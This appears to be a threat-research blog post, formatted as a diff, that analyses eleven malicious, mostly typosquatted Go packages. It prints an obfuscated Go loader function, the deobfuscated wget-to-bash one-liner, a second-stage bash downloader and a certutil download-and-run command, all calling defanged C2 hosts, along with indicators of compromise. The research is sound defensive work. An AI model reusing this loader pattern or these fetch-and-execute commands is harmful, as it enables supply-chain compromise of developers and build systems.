@@ -1,0 +1,144 @@
+Socket’s Threat Research Team uncovered eleven malicious Go packages, ten of which are still live on the Go Module and eight of which are typosquats, that conceal an identical index-based string obfuscation routine. At runtime the code silently spawns a shell, pulls a second-stage payload from an interchangeable set of .icu and .tech command and control (C2) endpoints, and executes it in memory. Most of the C2 endpoints share the path /storage/de373d0df/a31546bf, and six of the ten URLs are still reachable, giving the threat actor on-demand access to any developer or CI system that imports the packages.
+The 11 packages include the following:
+
+github.com/stripedconsu/linker
+github.com/agitatedleopa/stm
+github.com/expertsandba/opt
+github.com/wetteepee/hcloud-ip-floater
+github.com/weightycine/replika
+github.com/ordinarymea/tnsr_ids
+github.com/ordinarymea/TNSR_IDS
+github.com/cavernouskina/mcp-go
+github.com/lastnymph/gouid
+github.com/sinfulsky/gouid
+github.com/briefinitia/gouid
+The packages all use an exec.Command("/bin/sh","-c", <obfuscated>) construct. The array-driven decoder rebuilds a one-liner that downloads a bash script with wget -O - <C2> | /bin/bash & on Unix systems, or (2) uses -urlcache -split -f <C2> %TEMP%\\\\appwinx64.exe followed by a background start on Windows. Observed second-stage ELF and PE binaries enumerate host information, read browser data, and beacon outbound, often after a first stage triggers a one-hour sleep to evade sandboxes. Because the second-stage payload delivers a bash-scripted payload for Linux systems and retrieves Windows executables via certutil.exe, both Linux build servers and Windows workstations are susceptible to compromise.
+Obfuscated Loader Campaign via Malicious Go Packages#
+For sake of brevity, here is one example, from github.com/expertsandba/opt.
+The malicious functionality follows after 286 lines of code in this example.
+func QSpKOPl() error {
+	KusM := []string{"7", " ", "r", "m", "g", "d", " ", "d", "e", "f", "o", "/", "t", "d", "b", ".", " ", "a", "l", "t", "/", "o", "t", "b", "s", "/", "r", "h", "/", "s", "a", " ", "5", "e", "6", "3", "p", "t", "O", "u", "n", "3", "3", "i", "f", "s", "n", "e", "-", "/", "s", "4", "1", "/", "h", "c", " ", "b", "|", ":", "e", "i", "t", "-", "0", "a", "g", "o", "t", "&", "/", "w", " ", "e"}
+	aLPP := "/bin/sh"
+	uVbiVO := "-c"
+	NpRnhwXQ := KusM[71] + KusM[66] + KusM[73] + KusM[62] + KusM[16] + KusM[63] + KusM[38] + KusM[31] + KusM[48] + KusM[6] + KusM[27] + KusM[68] + KusM[19] + KusM[36] + KusM[29] + KusM[59] + KusM[49] + KusM[53] + KusM[3] + KusM[10] + KusM[46] + KusM[45] + KusM[21] + KusM[18] + KusM[60] + KusM[37] + KusM[12] + KusM[8] + KusM[2] + KusM[15] + KusM[61] + KusM[55] + KusM[39] + KusM[11] + KusM[24] + KusM[22] + KusM[67] + KusM[26] + KusM[65] + KusM[4] + KusM[33] + KusM[25] + KusM[13] + KusM[47] + KusM[41] + KusM[0] + KusM[42] + KusM[5] + KusM[64] + KusM[7] + KusM[44] + KusM[20] + KusM[17] + KusM[35] + KusM[52] + KusM[32] + KusM[51] + KusM[34] + KusM[23] + KusM[9] + KusM[1] + KusM[58] + KusM[72] + KusM[28] + KusM[57] + KusM[43] + KusM[40] + KusM[70] + KusM[14] + KusM[30] + KusM[50] + KusM[54] + KusM[56] + KusM[69]
+	exec.Command(aLPP, uVbiVO, NpRnhwXQ).Start()
+	return nil
+}
+The obfuscation works by establishing a string array, calling different indices of the array, and constructing a command from the indices. When deobfuscated, this code executes this command:
+/bin/sh -c wget -O - https://monsoletter[.]icu/storage/de373d0df/a31546bf | /bin/bash &
+The Socket Threat Research Team defanged all links.
+This command starts a shell that downloads a script fromhttps://monsoletter[.]icu/storage/de373d0df/a31546bf using wget and pipes it directly into bash for execution, without writing it to disk. The & runs the process in the background, allowing it to execute silently. The security industry has not yet marked this URL as malicious.
+Even more interesting, this link is still live.
+At this link, we discover this code:
+#!/bin/bash
+
+cd ~
+if [[ "$OSTYPE" == "linux-gnu"* ]]; then
+	if ! [ -f ./f0eee999 ]; then
+		sleep 3600
+		wget https://monsoletter[.]icu/storage/de373d0df/f0eee999
+		chmod +x ./f0eee999
+		app_process_id=$(pidof f0eee999)
+		if [[ -z $app_process_id ]]; then
+			./f0eee999
+		fi
+	fi
+fi
+This Bash script checks if it’s running on a Linux system, and if a file named f0eee999 doesn’t already exist in the home directory, it waits for 1 hour (sleep 3600) and then downloads the file from https://monsoletter[.]icu/storage/de373d0df/f0eee999 . It marks the file as executable and runs it, but only if it's not already running.
+At https://monsoletter[.]icu/storage/de373d0df/f0eee999, there is a known malicious, 9.4 MBbinary .elfpayload, with an SHA256 hash of: 844013025bf7c5d01e6f48df0e990103ad3c333be31f54cf5301e1463f6ca441. It reads the contents of the target machine’s file system, enumerates system information, and makes network requests.
+The Other 10 Packages#
+The other 10 packages follow a similar format, but with other randomly generated strings for the function and variable names.
+
+github.com/stripedconsu/linker deobfuscates to https://nymclassic[.]tech/storage/de373d0df/a31546bf. As of three months ago, this is a known malicious URL, well-documented in this post from klarrio.io from last month. The link itself is no longer live but could be replaced at any time.
+github.com/agitatedleopa/stm deobfuscates to https://alturastreet[.]icu/storage/de373d0df/a31546bf. As of three months ago, VirusTotal has also marked this URL as malicious. Socket previously broke the story on the alturastreet.icu domain in this post, however, we were referring to a different package with the same obfuscation pattern. This link is no longer active.
+github.com/wetteepee/hcloud-ip-floater deobfuscates to https://carvecomi[.]fun/storage/de373d0df/a31546bf. This URL has been marked as malicious and is no longer live. This blog post from Feb 26, 2025 by Mads Hougesen details the domains’ malicious functionality. However, the package discussed in that post is not the same as this package, even though the deobfuscation resolves to the same URL. This may indicate that it was the same threat actor.
+github.com/weightycine/replika deobfuscates to two commands, each with its own URL. First ishttps://infinityhel[.]icu/storage/de373d0df/a31546bf. VirusTotal marks this URL as malicious. This URL is also still live.
+The second deobfuscation becomes:
+cmd /C if not exist %UserProfile%\Downloads\appwinx64.exe certutil.exe -urlcache -split -f https://infinityhel[.]icu/storage/bbb28ef04/fa31546b %UserProfile%\Downloads\appwinx64.exe && start /b %UserProfile%\Downloads\appwinx64.exe/
+This Windows command checks if a file named appwinx64.exe does not already exist in the user's Downloads folder. If the file is missing, it uses certutil.exe (a native Windows utility) to download a file from https://infinityhel[.]icu/storage/bbb28ef04/fa31546b and save it as appwinx64.exe. The -urlcache -split -f flags are used to fetch the file from the URL and write it to disk. After downloading, the command uses start /b to silently run the downloaded executable in the background. VirusTotal has also marked this URL as malicious, but it is still live. The file downloaded is a malicious executable with a SHA256 hash of: 4a8bf419424ff42b736a51472d35a2c172e4c60b762c519b0b2f9eb04690726c. It reads web browser credentials and local system data and then makes external network requests.
+
+github.com/ordinarymea/tnsr_ids codes the malicious behavior as variables instead of functions, which is a distinction from all other packages. It again has two commands and two C2 URLs. Its first deobfuscated C2 URL is https://kaiaflow[.]icu/storage/de373d0df/a31546bf.
+The second command checks if a malicious executable exists in the user's AppData folder, and if not, downloads it from a remote server https://kaiaflow[.]icu/storage/bbb28ef04/fa31546b using curl, saves it as ilbeu.exe, then executes it in the background. This is a malware delivery system designed to establish persistent backdoor access on both Windows and Unix systems while avoiding detection through background execution.
+The first stage has a SHA256 hash value of 2b55430b90a500cb2bb9ddc530aeb1ffb8d2f8878148b7204ab7ef998d66eb9d and triggers the machine to sleep for an hour, limiting our ability to analyze its behavior. The second stage is also live, has a SHA256 hash of 42f3f9d2684328575847f3115fcd6f759cc47b0f21b3d4fea480de0f34a1e947, and exfiltrates stored browser data.
+
+github.com/ordinarymea/TNSR_IDS has the same exact functionality as the previous example, using the exact same coding techniques as well as the exact same C2 URLs, likely indicating that the same threat actor created at least these two.
+github.com/lastnymph/gouid again has two functions that deobfuscate to two commands. The first URL is https://kaiaflow[.]icu/storage/de373d0df/a31546bf. The next command first checks if appwinx64.exe exists in the user's Downloads folder, and if not, it uses certutil.exe to silently download it from https://kaiaflow[.]icu/storage/bbb28ef04/fa31546b. If the download succeeds, it runs the executable in the background. These are the exact same URLs as tnsr_ids and TNSR_IDS, further implicating the same threat actor.
+github.com/sinfulsky/gouid deobfuscates to the same URLs as the previous example.
+github.com/briefinitia/gouid deobfuscates to https://kavarecent[.]icu/storage/de373d0df/a31546bf. VirusTotal has flagged https://kavarecent[.]icu/storage/de373d0df/a31546bf as malicious. It has a SHA256 of c8ae8d69f465f2d1ca88907e75471299acbb76b5663dacca1520aaa4d99d7b43 and similarly causes the target machine to sleep for an hour, limiting our ability to analyze.
+github.com/cavernouskina/mcp-go deobfuscates to https://kavarecent[.]icu/storage/de373d0df/a31546bf, the same as the above example.
+Namespace Confusion#
+Unlike centralized package managers such as npm or PyPI, the Go ecosystem's decentralized nature where modules are directly imported from GitHub repositories can creates substantial confusion. Developers often encounter multiple similarly named modules with entirely different maintainers, as shown below. This ambiguity makes it challenging to identify legitimate packages from malicious impostors, even when packages aren't strictly "typosquatted."
+Usually, we’d expect to see one package with significantly more downloads, and unreasonably similar code or documentation, to conclude that packages are typosquatted. Due to Go’s decentralized nature, this high bar of definition is not always necessary to wreak havoc in a developer’s environment. Just searching on pkg.go.dev will not always yield conclusive results, as it can return with packages that do not match the name, as in the example below. Attackers exploit the confusion, carefully crafting their malicious module namespaces to appear trustworthy at a glance, significantly increasing the likelihood developers inadvertently integrate destructive code into their projects.
+Example of searching “linker” on pkg.go.dev.
+Although the fourth example in the above photo, github.com/logrange/linker only has 14 imports, when we compare documentation we can see that our malicious package, github.com/stripedconsu/linker, is a clear typosquat.
+Documentation of /logrange/linker
+Documentation imported in Socket for /stripedconsu/linker. The highlighted link connects to logrange documentation, solidifying this as a typosquat.
+Only three projects had imported the original STM package, and it was the fifth option when searching “stm" on the registry.
+Partial documentation of original STM package.
+Partial Documentation of malicious STM package.
+github.com/cavernouskina/mcp-go also has an obvious typosquat.
+Original and benign mcp-go package.
+Malicious MCP-go package.
+The rest of the packages:
+
+github.com/expertsandba/opt has no obvious typosquat. Although there are several packages with the same name, none have the same documentation.
+github.com/wetteepee/hcloud-ip-floater has no obvious typosquat.
+github.com/weightycine/replika has no obvious typosquat. Although there is one package with the same name, it does not have the same documentation.
+github.com/ordinarymea/tnsr_ids and github.com/ordinarymea/TNSR_IDS are obvious typosquats of each other, as well as another benign package.
+The bottom tnsr_ids does not have the malicious code, while the bottom two both do.
+
+github.com/lastnymph/gouid, github.com/sinfulsky/gouid, and github.com/briefinitia/gouid, are obviously typosquats of each other. They are also typosquats of a benign package by the same name.
+Summary#
+These packages have certain unexpected things in common:
+
+7 of the 10 distinct malicious C2 links end in: storage/de373d0df/a31546bf
+2 of the 10 distinct malicious C2 links end in: storage/bbb28ef04/fa31546b
+5 of the 11 packages have two or more C2 URLs.
+All of the packages deobfuscate to a payload with the format:
+/bin/sh -c wget -O - Malicious URL | /bin/bash &  although some also have other formats for secondary payloads.
+
+All of the packages use the same obfuscation technique
+8 of the 11 packages are typosquatted
+Although we do not have enough specific evidence from the threat actor to tie each of these packages together under the same campaign, we have more confidence that certain ones are by the same threat actor due to C2 reuse and the format of the code. The similar obfuscation technique is not sufficient to conclude that they were all created by the same threat actor as threat actors can share techniques.
+Previous Research#
+This malicious obfuscation is similar to packages the team has written about before:
+
+https://socket.dev/blog/wget-to-wipeout-malicious-go-modules-fetch-destructive-payload
+https://socket.dev/blog/typosquatted-go-packages-deliver-malware-loader
+In previous research, these packages typosquatted well-known Go modules. We saw that as a tactic here as well, but not in each of the packages.
+Outlook and Recommendations#
+The striking similarities in tactics, techniques, and procedures (TTPs) suggest a continuing threat to the Go ecosystem. Ten of the eleven malicious Go packages remain live, so the threat actor can simply rotate infrastructure while the packages stay available to unsuspecting developers. Nearly every hardcoded URL converges on the same /storage/de373d0df/a31546bf path, and every loader ultimately executes a one-liner that pipes a remote payload straight into bash, built from an index-based string-array obfuscation. This consistency signals a well-automated malicious chain that can be reintroduced in new packages. Developers should stay alert, using real-time scanning, dependency audits, and strict package management to guard against typosquatting and malicious obfuscation.
+The Go registry is insufficient defense against both typosquatting and malicious packages. Instead, Socket’s free security tools including our GitHub app, MCP product, CLI, and browser extension help detect and block suspicious packages before they are introduced into projects.
+Example of Socket’s Browser Extension on pkg.go.dev, allowing user to easily understand if a package is malware without consulting Socket’s webpage.
+Socket’s GitHub app scans pull requests, the CLI inspects go.mod and go.sum for threats, and the browser extension flags risky downloads in real time. Integrating these tools into daily workflows strengthens defenses across the board, from individual developers to entire organizations. Proactive defenses, such as verifying package integrity, monitoring new repositories, and sharing indicators of compromise, will be critical to reducing the risk of supply chain attacks.
+MITRE ATT&CK#
+T1059.004 - Command and Scripting Interpreter: Unix Shell
+T1059.003 – Command and Scripting Interpreter: Windows Command Shell
+T1218.010 – Signed Binary Proxy Execution: Certutil
+T1204.001 - User Execution: Malicious Link
+T1204.002 – User Execution: Malicious File
+T1105 - Ingress Tool Transfer
+T1055 - Process Injection
+T1027 - Obfuscation Files or Information
+T1036 — Masquerading (Namespace Typosquatting)
+Indicators of Compromise:#
+Malicious Packages
+C2 Infrastructure
+
+https://nymclassic[.]tech/storage/de373d0df/a31546bf
+https://alturastreet[.]icu/storage/de373d0df/a31546bf
+https://monsoletter[.]icu/storage/de373d0df/a31546bf
+https://monsoletter[.]icu/storage/de373d0df/f0eee999
+https://carvecomi[.]fun/storage/de373d0df/a31546bf
+https://infinityhel[.]icu/storage/de373d0df/a31546bf
+https://infinityhel[.]icu/storage/bbb28ef04/fa31546b
+https://kaiaflow[.]icu/storage/de373d0df/a31546bf
+https://kaiaflow[.]icu/storage/bbb28ef04/fa31546b
+https://kavarecent[.]icu/storage/de373d0df/a31546bf
+SHA256 Hashes
+
+844013025bf7c5d01e6f48df0e990103ad3c333be31f54cf5301e1463f6ca441
+4a8bf419424ff42b736a51472d35a2c172e4c60b762c519b0b2f9eb04690726c
+2b55430b90a500cb2bb9ddc530aeb1ffb8d2f8878148b7204ab7ef998d66eb9d
+c8ae8d69f465f2d1ca88907e75471299acbb76b5663dacca1520aaa4d99d7b43
+42f3f9d2684328575847f3115fcd6f759cc47b0f21b3d4fea480de0f34a1e947
